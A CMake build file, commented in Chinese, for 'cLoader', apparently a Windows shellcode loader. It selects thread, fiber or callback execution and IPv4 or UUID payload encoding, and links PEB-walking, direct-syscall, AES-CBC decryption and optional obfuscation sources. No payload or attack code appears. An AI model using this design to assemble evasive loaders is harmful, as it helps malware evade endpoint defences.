# CMakeList.txt: cLoader 的 CMake 项目，在此处包括源代码并定义
# 项目特定的逻辑。
#
cmake_minimum_required (VERSION 3.8)

# 强化 Release 配置
set(CMAKE_BUILD_TYPE Release)



if(EXECUTE_METHOD)
	if(EXECUTE_METHOD EQUAL 1)
		add_compile_definitions (EXECUTE_THREAD)
		message("-- EXECUTE_METHOD=${EXECUTE_METHOD},执行方式为线程")
	elseif(EXECUTE_METHOD EQUAL 2)
		add_compile_definitions (EXECUTE_FIBER)
		message("-- EXECUTE_METHOD=${EXECUTE_METHOD},执行方式为纤程")
	elseif(EXECUTE_METHOD EQUAL 3)
		add_compile_definitions (EXECUTE_CALLBACK)
		message("-- EXECUTE_METHOD=${EXECUTE_METHOD},执行方式为回调")
	endif()
else()
	set(CMAKE_ERROR_DEPRECATED TRUE)
	message(DEPRECATION "-- EXECUTE_METHOD不存在")
endif()

if(ENCODE_METHOD)
	if(ENCODE_METHOD EQUAL 1)
		add_compile_definitions (ENCODE_IPV4)
		message("-- ENCODE_METHOD=${ENCODE_METHOD},编码方式为ipv4")
	elseif(ENCODE_METHOD EQUAL 2)
		add_compile_definitions (ENCODE_UUID)
		message("-- ENCODE_METHOD=${ENCODE_METHOD},编码方式为uuid")
	endif()
else()
	set(CMAKE_ERROR_DEPRECATED TRUE)
	message(DEPRECATION "-- ENCODE_METHOD不存在")
endif()


# 将源代码添加到此项目的可执行文件。
add_library (cLoader SHARED  "src/cLoader.cpp" "include/cLoader.h" "src/decrypt.cpp" "src/peb.asm" "include/decrypt.h" "include/peb.h" "src/peb.cpp" "include/define.h" "include/syscall.h" "src/syscall.cpp" "src/syscall.x64.asm"  "include/cbc.h" "src/cbc.cpp" "include/aes.h" "src/aes.cpp" )
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/include)
ENABLE_LANGUAGE(ASM_MASM)
if (CMAKE_VERSION VERSION_GREATER 3.12)
  set_property(TARGET cLoader PROPERTY CXX_STANDARD 20)
endif()

# TODO: 如有需要，请添加测试并安装目标。
set(SRC_FILES
    src/cLoader.cpp
    src/decrypt.cpp
    src/peb.asm
    src/peb.cpp
    src/syscall.cpp
    src/syscall.x64.asm
    src/cbc.cpp
    src/aes.cpp
)

if(OBFUSCATION_FLAGS)
    message("-- 已启用混淆，参数 OBFUSCATION_FLAGS=${OBFUSCATION_FLAGS}")

    foreach(file ${SRC_FILES})
        if(file MATCHES "\\.cpp$")
            set_source_files_properties(${file} PROPERTIES COMPILE_FLAGS "${OBFUSCATION_FLAGS}")
        endif()
    endforeach()
else()
    message("-- 未指定 OBFUSCATION_FLAGS，未启用混淆。")
endif()
